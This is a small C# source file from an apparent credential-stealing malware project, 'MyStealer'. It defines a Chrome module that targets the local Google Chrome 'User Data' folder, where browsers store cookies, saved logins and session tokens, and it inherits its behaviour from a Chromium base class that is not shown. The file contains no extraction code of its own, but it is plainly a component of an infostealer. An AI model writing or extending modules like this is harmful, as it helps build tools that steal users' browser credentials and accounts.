using System.IO;
using System;

namespace MyStealer.Modules.Browser.ChromiumBased
{
    internal class Chrome : Chromium
    {
        public override string ApplicationName => "Chrome";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data");
    }
}
